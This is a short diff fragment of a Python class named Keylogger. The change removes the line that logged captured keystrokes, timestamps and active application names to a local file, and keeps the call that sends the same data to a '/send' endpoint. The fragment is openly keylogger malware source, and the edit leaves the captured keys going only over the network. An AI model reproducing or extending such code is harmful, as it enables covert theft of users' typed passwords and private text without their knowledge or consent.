@@ -121,7 +121,6 @@ class Keylogger:
                       self.elapsed_time = datetime.datetime.now()
               self.lastKey = key
 
-            f.write(time + ": " + appName + " - " + key + "\n")
             self.send_data('/send', {
                 "time": time,
                 "appName": appName,
